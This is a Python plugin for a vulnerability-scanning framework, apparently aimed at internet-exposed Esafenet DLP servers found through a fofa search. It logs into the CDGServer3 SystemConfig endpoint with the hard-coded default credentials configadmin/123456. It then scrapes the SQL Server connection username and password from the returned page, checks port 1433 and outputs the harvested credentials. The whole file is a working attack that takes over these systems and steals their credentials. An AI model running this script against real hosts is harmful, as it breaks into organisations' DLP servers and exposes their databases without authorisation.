#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from bs4 import BeautifulSoup
from lib.util.aiohttputil import ClientSession
from lib.util.aiohttputil import open_connection
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
        fofa: app="亿赛通DLP"
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                name = ''
                url1 = self.base_url + 'CDGServer3/help/getEditionInfo.jsp'
                try:
                    async with session.get(url=url1) as res1:
                        if res1:
                            text1 = await res1.text()
                            if text1:
                                soup = BeautifulSoup(text1, 'html5lib')
                                if '授权用户' in text1:
                                    name = soup.select('body > div:nth-of-type(2) > table > tbody > tr:nth-of-type(6) > td:nth-of-type(2) > input[type="text"]')
                                else:
                                    name = soup.select('body > div:nth-of-type(2) > table > tbody > tr:nth-of-type(5) > td:nth-of-type(2) > input[type="text"]')
                                if len(name) > 0:
                                    name = name[0]['value']

                    url2 = self.base_url + 'CDGServer3/SystemConfig'
                    _data = {'command': 'Login', 'verifyCodeDigit': 'dfd', 'name': 'configadmin', 'pass': '123456'}

                    async with session.post(url=url2, data=_data) as res2:
                        if res2:
                            text2 = await res2.text()

                            soup = BeautifulSoup(text2, 'html5lib')
                            sql_user = soup.select('#est\\.connection\\.username')[0]['value']
                            sql_pass = soup.select('#est\\.connection\\.password')[0]['value']
                            sql_result = name + '/' + sql_user + '/' + sql_pass
                            sql_result = self.host + ":1433/" + sql_result

                            yield url1

                            reader, writer = await open_connection(self.host, 1433)
                            writer.write("test\r\n".encode())
                            data = await reader.read(1024)
                            writer.close()

                            yield f"{sql_result}    configadmin/123456"
                except:
                    pass

